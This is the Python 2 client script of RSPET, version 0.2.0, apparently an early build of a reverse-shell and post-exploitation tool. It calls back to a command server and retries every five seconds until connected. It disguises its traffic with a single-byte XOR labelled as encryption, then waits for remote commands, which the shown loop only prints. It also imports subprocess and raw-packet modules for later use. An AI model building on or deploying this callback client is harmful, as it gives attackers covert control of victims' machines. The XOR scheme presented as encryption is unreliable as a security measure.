#!/usr/bin/env python2
# -*- coding: <UTF-8> -*-
"""rspet_client.py: RSPET's Client-side script."""

from __future__ import print_function
from sys import exit as sysexit, argv
from time import sleep
from subprocess import Popen, PIPE
from multiprocessing import Process, freeze_support
from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
from socket import error as sock_error
from pinject import UDP, IP

__author__ = ["Kolokotronis Panagiotis", "Dimitris Zervas"]
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis, Dimitris Zervas"
__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura", "Dimitris Zervas"]
__license__ = "MIT"
__version__ = "0.2.0"
__maintainer__ = ["Kolokotronis Panagiotis", "Dimitris Zervas"]

class Client:
    """Main client class."""
    ip = None
    port = None
    version = None
    type = "full"
    sock = None

    def __init__(self, ip="127.0.0.1", port="9000"):
        """Connects to server and initializes variables"""
        self.ip = ip
        self.port = int(port)
        self.reconnect()

    def loop(self):
        while True:
            cmd = self.recv(5)
            print(cmd)

    def reconnect(self):
        if self.sock is not None:
            self.sock.close()
        self.sock = socket(AF_INET, SOCK_STREAM)

        while True:
            try:
                self.sock.connect((self.ip, self.port))
            except sock_error:
                sleep(5)
            else:
                if self.send("%s-%s" % (self.version, self.type)) == 1:
                    sysexit()
                break

    def send(self, msg):
        """Send message to host"""
        if msg is not None and len(msg) > 0:
            return self.sock.send(self._enc(msg))

    def recv(self, size):
        """Receive from host"""
        if size > 0:
            return self._dec(self.sock.recv(size))

    def _enc(self, data):
        """Encrypt message (before send)"""
        out = bytearray(data, 'UTF-8')
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

    def _dec(self, data):
        """Decrypt message (after receive)"""
        out = bytearray(data)
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

if __name__ == '__main__':
    freeze_support()
    client = Client()
    Process(target=client.loop).start()
